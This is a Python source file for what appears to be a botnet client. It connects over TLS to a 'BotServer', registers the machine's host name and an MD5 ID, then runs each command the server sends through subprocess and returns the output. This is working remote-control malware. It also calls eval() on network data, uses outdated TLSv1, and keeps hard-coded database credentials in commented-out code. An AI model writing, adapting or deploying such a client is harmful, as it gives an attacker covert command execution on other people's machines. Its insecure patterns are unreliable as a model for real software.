#!/usr/bin/env python3
import os
import sys
import ssl
import socket
import subprocess
import pymysql
from hashlib import md5
from random import randint, getrandbits

#NOTE: Client should not have to access the database

#TODO: Tidy and Clean code up


class Client:
    cert = "ssl_files/certificate.crt"

    def __init__(self):
        #addr = (input("IP: "), int(input("Port: ")))
        addr = ("127.0.0.1", 999)
        try:
            self.client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ssl_client = self.ssl_wrap(addr)

            ID = str(getrandbits(randint(0, 999999)))
            hashID = md5(ID.encode("utf-8")).hexdigest()

            ssl_client.send("{}:--_:_--:{}".format(socket.gethostname(), hashID).encode("utf-8"))
            print("[+] Connected to server, Client-ID: {}".format(hashID))

            #db = pymysql.connect("127.0.0.1", "root", "pass", "Bots")
            #cursor = db.cursor()
            #cursor.execute("SET FOREIGN_KEY_CHECKS = 0;insert into Client values ('{}', '{}', 0);SET FOREIGN_KEY_CHECKS = 1;".format(hashID, socket.gethostname()))
            #db.commit()

            while True:
                #receievs/replies command-ID and command
                data = ssl_client.read().decode("utf-8")
                if not data or eval(data)[0] != "COMMAND": break
                data = eval(data)
                print(data)
                res = self.command(data[1][2])
                res = res.stdout if res.stdout else res.stderr
                rep = str(["COMMAND_RESULT", data[1][0], data[1][1], data[1][2], res.decode("utf-8")]).encode("utf-8")
                ssl_client.write(rep)

        except KeyboardInterrupt:
            ssl_client.write(str(["EXIT"]).encode("utf-8"))

        #cursor.execute("SET FOREIGN_KEY_CHECKS = 0;delete from Client where ClientID = '{}';SET FOREIGN_KEY_CHECKS = 1;".format(hashID))
        #db.commit()
        #db.close()

        ssl_client.close()
        self.client_sock.close()
        print("[-] Client closed.")
        print("[-] Server closed.")

    def ssl_wrap(self, addr):
        ssl_sock = ssl.wrap_socket(self.client_sock, cert_reqs=ssl.CERT_REQUIRED, ssl_version=ssl.PROTOCOL_TLSv1, ca_certs=Client.cert)
        ssl_sock.connect(addr)

        cert = ssl_sock.getpeercert()
        if not cert or ssl.match_hostname(cert, "BotServer"):
            raise Exception("Invalid certificate from server.")
        return ssl_sock

    def command(self, cmd):
        print(cmd.split(" "))
        res = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #sock.write(res.stdout if res.stdout else res.stderr
        print("COMMAND: {}\n".format(cmd))
        return res

if __name__ == '__main__':
    Client()
